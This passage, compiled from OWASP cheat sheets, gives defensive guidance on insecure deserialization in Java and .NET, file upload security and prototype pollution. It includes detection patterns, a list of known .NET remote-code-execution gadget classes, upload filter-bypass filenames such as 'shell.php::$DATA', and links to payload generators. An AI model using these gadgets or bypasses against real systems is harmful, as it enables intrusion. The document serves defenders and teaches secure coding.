issues if not configured correctly. This section lists some of these libraries and
recommended configuration options to avoid security issues when deserializing untrusted data:

**Can be used safely with default configuration:**

The following libraries can be used safely with default configuration:

- **[fastjson2](https://github.com/alibaba/fastjson2)** (JSON) - can be used safely as long as
the [**autotype**](https://github.com/alibaba/fastjson2/wiki/fastjson2_autotype_cn) option is not turned on
- **[jackson-databind](https://github.com/FasterXML/jackson-databind)** (JSON) - can be used safely as long
as polymorphism is not used ([see blog post](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062))
- **[Kryo v5.0.0+](https://github.com/EsotericSoftware/kryo)** (custom format) - can be used safely
as long as class registration is not turned **off** ([see documentation](https://github.com/EsotericSoftware/kryo#optional-registration)
and [this issue](https://github.com/EsotericSoftware/kryo/issues/929))
- **[YamlBeans v1.16+](https://github.com/EsotericSoftware/yamlbeans)** (YAML) - can be used safely
as long as the **UnsafeYamlConfig** class isn't used (see [this commit](https://github.com/EsotericSoftware/yamlbeans/commit/b1122588e7610ae4e0d516c50d08c94ee87946e6))
    - *NOTE: because these versions are not available in Maven Central,
[a fork exists](https://github.com/Contrast-Security-OSS/yamlbeans) that can be used instead.*
- **[XStream v1.4.17+](https://x-stream.github.io/)** (JSON and XML) - can be used safely
as long as the allowlist and other security controls are not relaxed ([see documentation](https://x-stream.github.io/security.html))

**Requires configuration before can be used safely:**

The following libraries require configuration options to be set before they can be used safely:

- **[fastjson v1.2.68+](https://github.com/alibaba/fastjson)** (JSON) - cannot be used safely unless
the [**safemode**](https://github.com/alibaba/fastjson/wiki/fastjson_safemode_en) option is turned on, which disables
deserialization of any class ([see documentation](https://github.com/alibaba/fastjson/wiki/enable_autotype)).
Previous versions are not safe.
- **[json-io](https://github.com/jdereg/json-io)** (JSON) - cannot be used safely since the use of **@type** property in
JSON allows deserialization of any class. Can only be used safely in following situations:
    - In [non-typed mode](https://github.com/jdereg/json-io/blob/master/user-guide.md#non-typed-usage) using the **JsonReader.USE_MAPS** setting which turns off generic object deserialization
    - [With a custom deserializer](https://github.com/jdereg/json-io/blob/master/user-guide.md#customization-technique-4-custom-serializer) controlling which classes get deserialized
- **[Kryo < v5.0.0](https://github.com/EsotericSoftware/kryo)** (custom format) - cannot be used safely unless class registration is turned **on**,
which disables deserialization of any class ([see documentation](https://github.com/EsotericSoftware/kryo#optional-registration)
and [this issue](https://github.com/EsotericSoftware/kryo/issues/929))
    - *NOTE: other wrappers exist around Kryo such as [Chill](https://github.com/twitter/chill), which may also have class registration
not required by default regardless of the underlying version of Kryo being used*
- **[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/src)** (YAML) - cannot be used safely unless
the **org.yaml.snakeyaml.constructor.SafeConstructor** class is used, which disables
deserialization of any class ([see docs](https://bitbucket.org/snakeyaml/snakeyaml/wiki/CVE-2022-1471))

**Cannot be used safely:**

The following libraries are either no longer maintained or cannot be used safely with untrusted input:

- **[Castor](https://github.com/castor-data-binding/castor)** (XML) - appears to be abandoned with no commits since 2016
- **[fastjson < v1.2.68](https://github.com/alibaba/fastjson)** (JSON) - these versions allows deserialization of any class
([see documentation](https://github.com/alibaba/fastjson/wiki/enable_autotype))
- **[XMLDecoder in the JDK](https://docs.oracle.com/javase/8/docs/api/java/beans/XMLDecoder.html)** (XML) - *"close to impossible to securely deserialize Java objects in this format from untrusted inputs"*
("Red Hat Defensive Coding Guide", [end of section 2.6.5](https://redhat-crypto.gitlab.io/defensive-coding-guide/#sect-Defensive_Coding-Tasks-Serialization-XML))
- **[XStream < v1.4.17](https://x-stream.github.io/)** (JSON and XML) - these versions allows deserialization of any class (see [documentation](https://x-stream.github.io/security.html#explicit))
- **[YamlBeans < v1.16](https://github.com/EsotericSoftware/yamlbeans)** (YAML) - these versions allows deserialization of any class
(see [this document](https://github.com/Contrast-Security-OSS/yamlbeans/blob/main/SECURITY.md))

#### .Net CSharp

##### Clear-box Review

Search the source code for the following terms:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Look for any serializers where the type is set by a user controlled variable.

##### Opaque-box Review

Search for the following base64 encoded content that starts with:

```text
AAEAAAD/////
```

Search for content with the following text:

1. `TypeObject`
2. `$type:`

##### General Precautions

Microsoft has stated that the `BinaryFormatter` type is dangerous and cannot be secured. As such, it should not be used. Full details are in the [BinaryFormatter security guide](https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide).

Don't allow the datastream to define the type of object that the stream will be deserialized to. You can prevent this by for example using the `DataContractSerializer` or `XmlSerializer` if at all possible.

Where `JSON.Net` is being used make sure the `TypeNameHandling` is only set to `None`.

```csharp
TypeNameHandling = TypeNameHandling.None
```

If `JavaScriptSerializer` is to be used then do not use it with a `JavaScriptTypeResolver`.

If you must deserialize data streams that define their own type, then restrict the types that are allowed to be deserialized. One should be aware that this is still risky as many native .Net types potentially dangerous in themselves. e.g.

```csharp
System.IO.FileInfo
```

`FileInfo` objects that reference files actually on the server can when deserialized, change the properties of those files e.g. to read-only, creating a potential denial of service attack.

Even if you have limited the types that can be deserialized remember that some types have properties that are risky. `System.ComponentModel.DataAnnotations.ValidationException`, for example has a property `Value` of type `Object`. if this type is the type allowed for deserialization then an attacker can set the `Value` property to any object type they choose.

Attackers should be prevented from steering the type that will be instantiated. If this is possible then even `DataContractSerializer` or `XmlSerializer` can be subverted e.g.

```csharp
// Action below is dangerous if the attacker can change the data in the database
var typename = GetTransactionTypeFromDatabase();

var serializer = new DataContractJsonSerializer(Type.GetType(typename));

var obj = serializer.ReadObject(ms);
```

Execution can occur within certain .Net types during deserialization. Creating a control such as the one shown below is ineffective.

```csharp
var suspectObject = myBinaryFormatter.Deserialize(untrustedData);

//Check below is too late! Execution may have already occurred.
if (suspectObject is SomeDangerousObjectType)
{
    //generate warnings and dispose of suspectObject
}
```

For `JSON.Net` it is possible to create a safer form of allow-list control using a custom `SerializationBinder`.

Try to keep up-to-date on known .Net insecure deserialization gadgets and pay special attention where such types can be created by your deserialization processes. **A deserializer can only instantiate types that it knows about**.

Try to keep any code that might create potential gadgets separate from any code that has internet connectivity. As an example `System.Windows.Data.ObjectDataProvider` used in WPF applications is a known gadget that allows arbitrary method invocation. It would be risky to have this a reference to this assembly in a REST service project that deserializes untrusted data.

##### Known .NET RCE Gadgets

- `System.Configuration.Install.AssemblyInstaller`
- `System.Activities.Presentation.WorkflowDesigner`
- `System.Windows.ResourceDictionary`
- `System.Windows.Data.ObjectDataProvider`
- `System.Windows.Forms.BindingSource`
- `Microsoft.Exchange.Management.SystemManager.WinForms.ExchangeSettingsProvider`
- `System.Data.DataViewManager, System.Xml.XmlDocument/XmlDataDocument`
- `System.Management.Automation.PSObject`

### Language-Agnostic Methods for Deserializing Safely

#### Using Alternative Data Formats

A great reduction of risk is achieved by avoiding native (de)serialization formats. By switching to a pure data format like JSON or XML, you lessen the chance of custom deserialization logic being repurposed towards malicious ends.

Many applications rely on a [data-transfer object pattern](https://en.wikipedia.org/wiki/Data_transfer_object) that involves creating a separate domain of objects for the explicit purpose data transfer. Of course, it's still possible that the application will make security mistakes after a pure data object is parsed.

#### Only Deserialize Signed Data

If the application knows before deserialization which messages will need to be processed, they could sign them as part of the serialization process. The application could then to choose not to deserialize any message which didn't have an authenticated signature.

### Mitigation Tools/Libraries

- [Java secure deserialization library](https://github.com/ikkisoft/SerialKiller)
- [SWAT - tool for creating allowlists](https://github.com/cschneider4711/SWAT)
- [NotSoSerial](https://github.com/kantega/notsoserial)

### Detection Tools

- [Java deserialization cheat sheet aimed at pen testers](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
- [A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.](https://github.com/frohoff/ysoserial)
- [Java De-serialization toolkits](https://github.com/brianwrf/hackUtils)
- [Java de-serialization tool](https://github.com/frohoff/ysoserial)
- [.Net payload generator](https://github.com/pwntester/ysoserial.net)
- [Burp Suite extension](https://github.com/federicodotta/Java-Deserialization-Scanner/releases)
- [Java secure deserialization library](https://github.com/ikkisoft/SerialKiller)
- [Serianalyzer is a static bytecode analyzer for deserialization](https://github.com/mbechler/serianalyzer)
- [Payload generator](https://github.com/mbechler/marshalsec)
- [Android Java Deserialization Vulnerability Tester](https://github.com/modzero/modjoda)
- Burp Suite Extension
    - [JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller)
    - [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)
    - [Burp-ysoserial](https://github.com/summitt/burp-ysoserial)
    - [SuperSerial](https://github.com/DirectDefense/SuperSerial)
    - [SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active)

## File Upload

> **Source:** [File Upload](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

File upload is becoming a more and more essential part of any application, where the user is able to upload their photo, their CV, or a video showcasing a project they are working on. The application should be able to fend off bogus and malicious files in a way to keep the application and the users safe.

In short, the following principles should be followed to reach a secure file upload implementation:

- **List allowed extensions. Only allow safe and critical extensions for business functionality**
    - **Ensure that [input validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#file-upload-validation) is applied before validating the extensions.**
- **Validate the file type, don't trust the [Content-Type header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type) as it can be spoofed**
- **Change the filename to something generated by the application**
- **Set a filename length limit. Restrict the allowed characters if possible**
- **Set a file size limit**
- **Only allow authorized users to upload files**
- **Store the files on a different server. If that's not possible, store them outside of the webroot**
    - **In the case of public access to the files, use a handler that gets mapped to filenames inside the application (someid -> file.ext)**
- **Run the file through an antivirus or a sandbox if available to validate that it doesn't contain malicious data**
- **Run the file through CDR (Content Disarm & Reconstruct) if applicable type (PDF, DOCX, etc...)**
- **Ensure that any libraries used are securely configured and kept up to date**
- **Protect the file upload from [CSRF](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) attacks**

### File Upload Threats

In order to assess and know exactly what controls to implement, knowing what you're facing is essential to protect your assets. The following sections will hopefully showcase the risks accompanying the file upload functionality.

#### Malicious Files

The attacker delivers a file for malicious intent, such as:

1. Exploit vulnerabilities in the file parser or processing module (_e.g._ [ImageTrick Exploit](https://imagetragick.com/), [XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing))
2. Use the file for phishing (_e.g._ careers form)
3. Send ZIP bombs, XML bombs (otherwise known as billion laughs attack), or simply huge files in a way to fill the server storage which hinders and damages the server's availability
4. Overwrite an existing file on the system
5. Client-side active content (XSS, CSRF, etc.) that could endanger other users if the files are publicly retrievable.

#### Public File Retrieval

If the file uploaded is publicly retrievable, additional threats can be addressed:

1. Public disclosure of other files
2. Initiate a DoS attack by requesting lots of files. Requests are small, yet responses are much larger
3. File content that could be deemed as illegal, offensive, or dangerous (_e.g._ personal data, copyrighted data, etc.) which will make you a host for such malicious files.

### File Upload Protection

There is no silver bullet in validating user content. Implementing a defense in depth approach is key to make the upload process harder and more locked down to the needs and requirements for the service. Implementing multiple techniques is key and recommended, as no one technique is enough to secure the service.

#### Extension Validation

Ensure that the validation occurs after decoding the filename, and that a proper filter is set in place in order to avoid certain known bypasses, such as the following:

- Double extensions, _e.g._ `.jpg.php`, where it circumvents easily the regex `\.jpg`
- Null bytes, _e.g._ `.php%00.jpg`, where `.jpg` gets truncated and `.php` becomes the new extension
- Case manipulation, _e.g._ `.pHp`, `.phP`, to bypass case-sensitive blocklist filters
- Alternative extensions that may be mapped to the same server-side interpreter depending on configuration, _e.g._ `.phtml`, `.php5`, `.pht` for PHP, or `.jsp`/`.jspx`, `.asp`/`.aspx` for Java/.NET ([PortSwigger](https://portswigger.net/web-security/file-upload))
- Windows NTFS Alternate Data Streams, _e.g._ `shell.asp:.jpg` or `shell.php::$DATA`, where the colon is interpreted as a stream separator and the actual file created on disk carries the extension before the colon - reject any filename containing a colon (`:`) ([OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload))
- Generic bad regex that isn't properly tested and well reviewed. Refrain from building your own logic unless you have enough knowledge on this topic.

Refer to the [Input Validation CS](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) to properly parse and process the extension.

##### List Allowed Extensions

Ensure the usage of _business-critical_ extensions only, without allowing any type of _non-required_ extensions. For example if the system requires:

- image upload, allow one type that is agreed upon to fit the business requirement;
- cv upload, allow `docx` and `pdf` extensions.

Based on the needs of the application, ensure the **least harmful** and the **lowest risk** file types to be used.

##### Block Extensions

Identify potentially harmful file types and block extensions that you regard harmful to your service.

Please be aware that blocking specific extensions is a weak protection method on its own. The [Unrestricted File Upload vulnerability](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) article describes how attackers may attempt
to bypass such a check.

#### Content-Type Validation

_The Content-Type for uploaded files is provided by the user, and as such cannot be trusted, as it is trivial to spoof. Although it should not be relied upon for security, it provides a quick check to prevent users from unintentionally uploading files with the incorrect type._

Other than defining the extension of the uploaded file, its MIME-type can be checked for a quick protection against simple file upload attacks.

This can be done preferably in an allowlist approach; otherwise, this can be done in a denylist approach.

#### File Signature Validation

In conjunction with [content-type validation](#content-type-validation), validating the file's signature can be checked and verified against the expected file that should be received.

> This should not be used on its own, as bypassing it is pretty common and easy.

#### Filename Safety

Filenames can endanger the system in multiple ways, either by using non acceptable characters, or by using special and restricted filenames. For Windows, refer to the following [MSDN guide](https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file?redirectedfrom=MSDN#naming-conventions). For a wider overview on different filesystems and how they treat files, refer to [Wikipedia's Filename page](https://en.wikipedia.org/wiki/Filename).

In order to avoid the above mentioned threat, creating a **random string** as a filename, such as generating a UUID/GUID, is essential. If the filename is required by the business needs, proper input validation should be done for client-side (_e.g._ active content that results in XSS and CSRF attacks) and back-end side (_e.g._ special files overwrite or creation) attack vectors. Filename length limits should be taken into consideration based on the system storing the files, as each system has its own filename length limit. If user filenames are required, consider implementing the following:

- Implement a maximum length
- Restrict characters to an allowed subset specifically, such as alphanumeric characters, hyphen, spaces, and periods
    - Consider telling the user what an acceptable filename is.
    - Restrict use of leading periods (hidden files) and sequential periods (directory traversal).
    - Restrict the use of a leading hyphen or spaces to make it safer to use shell scripts to process files.
    - If this is not possible, block-list dangerous characters that could endanger the framework and system that is storing and using the files.

On Windows/NTFS, a long filename may have an [8.3 short name alias](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file#short-vs-long-names), depending on file system settings. Do not assume that an alias exists or has a particular spelling. If an overwrite or collision check validates only the long filename supplied by the user, an attacker who can predict the short alias of an existing sensitive file may reference it directly to overwrite that file, bypassing an exact-name or extension check. Generating the stored filename server-side, as recommended above, removes this risk, since the attacker no longer controls which file is targeted. Disabling [short-name creation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-behavior#parameters) prevents new aliases; it does not remove existing aliases. Assess existing short names separately before relying on this setting: Microsoft documents [removal and compatibility checks](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-8dot3name), including backup precautions before removal.

#### File Content Validation

As mentioned in the [Public File Retrieval](#public-file-retrieval) section, file content can contain malicious, inappropriate, or illegal data.

Based on the expected type, special file content validation can be applied:

- For **images**, decode and re-encode to an allowed image format, explicitly [removing unnecessary metadata](https://imagemagick.org/command-line-options/#strip). Rewriting does not guarantee that all malicious content is removed, and the image processor itself handles untrusted input. Use an up-to-date library with [restricted formats, resource limits, and sandboxing](https://imagemagick.org/security-policy/#other).
- For **Microsoft documents**, the usage of [Apache POI](https://poi.apache.org/) helps validating the uploaded documents.
- **ZIP files** are not recommended since they can contain all types of files, and the attack vectors pertaining to them are numerous.

The File Upload service should allow users to report illegal content, and copyright owners to report abuse.

If there are enough resources, manual file review should be conducted in a sandboxed environment before releasing the files to the public.

Adding some automation to the review could be helpful, which is a harsh process and should be well studied before its usage. Some services (_e.g._ Virus Total) provide APIs to scan files against well known malicious file hashes. Some frameworks can check and validate the raw content type and validating it against predefined file types, such as in [ASP.NET Drawing Library](https://docs.microsoft.com/en-us/dotnet/api/system.drawing.imaging.imageformat). Beware of data leakage threats and information gathering by public services.

#### File Storage Location

The location where the files should be stored must be chosen based on security and business requirements. The following points are set by security priority, and are inclusive:

1. Store the files on a **different host**, which allows for complete segregation of duties between the application serving the user, and the host handling file uploads and their storage.
2. Store the files **outside the webroot**, where only administrative access is allowed.
3. Store the files **inside the webroot**, and set them in write permissions only.
   - If read access is required, setting proper controls is a must (_e.g._ internal IP, authorized user, etc.)

Storing files in a studied manner in databases is one additional technique. This is sometimes used for automatic backup processes, non file-system attacks, and permissions issues. In return, this opens up the door to performance issues (in some cases), storage considerations for the database and its backups, and this opens up the door to SQLi attack. This is advised only when a DBA is on the team and that this process shows to be an improvement on storing them on the file-system.

Be aware that an attacker may attempt to upload a web server configuration file (_e.g._ `.htaccess`, `web.config`) into the upload directory. If the web server allows per-directory configuration overrides, such a file could be used to change how that directory handles file types, for example mapping an otherwise harmless extension to be executed by the server. As a second layer of defense, disable per directory configuration overrides on upload directories at the web server level (_e.g._ Apache `AllowOverride None`, locked IIS handler mappings), in addition to storing files outside the webroot as recommended above.

> Some files are emailed or processed once they are uploaded, and are not stored on the server. It is essential to conduct the security measures discussed in this sheet before doing any actions on them.

#### User Permissions

Before any file upload service is accessed, proper validation should occur on two levels for the user uploading a file:

- Authentication level
    - The user should be a registered user, or an identifiable user, in order to set restrictions and limitations for their upload capabilities
- Authorization level
    - The user should have appropriate permissions to access or modify the files

#### Filesystem Permissions

> Set the files permissions on the principle of least privilege.

Files should be stored in a way that ensures:

- Allowed system users are the only ones capable of reading the files
- Required modes only are set for the file
    - If execution is required, scanning the file before running it is required as a security best practice, to ensure that no macros or hidden scripts are available.

#### Upload and Download Limits

The application should set proper size limits for the upload service in order to protect the file storage capacity. If the system is going to extract the files or process them, the file size limit should be considered after file decompression is conducted and by using secure methods to calculate zip files size. For more on this, see how to [Safely extract files from ZipInputStream](https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream), Java's input stream to handle ZIP files.

The application should set proper request limits as well for the download service if available to protect the server from DoS attacks.

### Java Code Snippets

[Document Upload Protection](https://github.com/righettod/document-upload-protection) repository written by Dominique for certain document types in Java.

## Prototype Pollution Prevention

> **Source:** [Prototype Pollution Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Explanation

Prototype Pollution is a critical vulnerability that can allow attackers to manipulate an application's JavaScript objects and properties, leading to serious security issues such as unauthorized access to data, privilege escalation, and even remote code execution.

For examples of why this is dangerous, see the links in the [Other resources](#other-resources) section below.

### Suggested protection mechanisms

#### Use "new Set()" or "new Map()"

Developers should use `new Set()` or `new Map()` instead of using object literals:

```javascript
let allowedTags = new Set();
allowedTags.add('b');
if(allowedTags.has('b')){
  //...
}

let options = new Map();
options.set('spaces', 1);
let spaces = options.get('spaces')
```

#### If objects or object literals are required

If objects have to be used then they should be created using the `Object.create(null)` API to ensure they don't inherit from the Object prototype:

```javascript
let obj = Object.create(null);
```

If object literals are required then as a last resort you could use the `__proto__` property:

```javascript
let obj = {__proto__:null};
```

#### Use object "freeze" and "seal" mechanisms

Freezing built-in prototypes with [`Object.freeze()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze) prevents adding or removing their properties and makes existing data properties non-writable. Freezing is shallow: objects referenced by those properties remain mutable unless separately frozen. Test compatibility first, because libraries that modify built-in prototypes can break.

[`Object.seal()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/seal) only prevents adding or removing properties and changing their configuration; existing writable property values can still change. Do not rely on sealing to prevent those modifications.

#### Node.js configuration flag

Node.js also offers the ability to remove the `__proto__` property completely using the `--disable-proto=delete` flag. Note this is a defense in depth measure.

Prototype pollution is still possible using `constructor.prototype` properties but removing `__proto__` helps reduce attack surface and prevent certain attacks.

#### Other resources

- [What is prototype pollution? (Portswigger Web Security Academy)](https://portswigger.net/web-security/prototype-pollution)
- [Prototype pollution (Snyk Learn)](https://learn.snyk.io/lessons/prototype-pollution/javascript/)

#### Credits

Credit to [Gareth Hayes](https://garethheyes.co.uk/) for providing the original protection guidance [in this comment](https://github.com/OWASP/ASVS/issues/1563#issuecomment-1470027723).
